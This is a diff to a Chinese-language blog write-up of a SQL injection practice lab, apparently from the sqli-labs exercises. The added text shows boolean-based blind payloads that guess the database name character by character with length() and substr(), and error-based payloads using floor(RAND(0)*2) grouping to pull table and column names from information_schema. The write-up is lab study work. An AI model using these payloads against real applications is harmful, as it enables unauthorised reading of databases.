@@ -46,7 +46,7 @@ tags:
 
 
 
-不显示东西。。如果有记录的话就会显示 “you are in” ，没记录的话直接就报错了，这里我没办法了，上网看了别人的解决方案，学习到了一波新的知识
+不显示东西。。如果有记录的话就会显示 “you are in” ，没记录的话直接就报错了，这里我没办法了，上网看了别人的解决方案，学习到了一波新的知识然后自己用不同方法做了一遍
 
 
 
@@ -92,6 +92,24 @@ ERROR 1062 (23000): Duplicate entry '------1' for key 'group_key'
 
 
 
+> 这里分享一下网上一位老哥的做法，有点啰嗦，但是很巧妙，用 substr() , ascii() 等函数将数据库名字分来，一位意味猜，这算是基于布尔的盲注了
+
+
+
+根据报错与否判断出数据库的长度
+
+```sql
+' or length(database())=8 --+
+```
+
+再根据 ASCII 字符的大小比较来判断数据库每一位是什么，就这样一位一位硬核爆出来，感觉思路很好，万一有些函数被禁了就可以尝试一下这种方法
+
+```sql
+' or substr(database(),2,1)='e' --+
+```
+
+
+
 再查询相关信息，平台，数据库版本等
 
 ```sql
@@ -102,15 +120,33 @@ ERROR 1062 (23000): Duplicate entry '------1' for key 'group_key'
 
 
 
+接下去就爆出表的名字，但是报错了，说子查询的结果多于 1 列
+
+```sql
+' union select 1, count(*),concat_ws('-', (select table_name from information_schema.tables where table_schema='security'),floor(RAND(0)*2))a from information_schema.tables where table_schema='security' group by a--+
+```
+
+![table](https://i.loli.net/2020/01/06/d2HEZam7RnJs1Ml.png)
 
 
 
+想起来，这种基于聚合函数的报错只能用 limit 一条一条看，那就改一下，一个一个查，查到三张表，`uagents`、`users` 、`emails` 和 `referers` 
+
+![tables](C:\Users\kevin\AppData\Roaming\Typora\typora-user-images\1578315709270.png)
 
 
 
+表名应该就是 users 了，就算不是也可以一个一个查。知道数据库和表名，字段的个数也知道了，接下去就判断字段的名称了，先用 count 查到有 3 个字段（废话，前面就已经知道了，只是提供一种方法）
+
+```sql
+' union select 1, count(*),concat_ws('-', (select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 1, 1), floor(RAND(0)*2))a from information_schema.tables where table_schema='security' group by a--+
+```
+
+![column_name](C:\Users\kevin\AppData\Roaming\Typora\typora-user-images\1578317810619.png)
 
 
-' union select 1, count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),'-',floor(RAND(0)*2))a from information_schema.tables group by a--+
+
+然后就一个一个爆字段，得到所有的字段名和在表中的顺序，到这里也就将所有的信息都爆出来了，结束注入，第六题是一样的，就是将单引号变成双引号而已
 
 
 
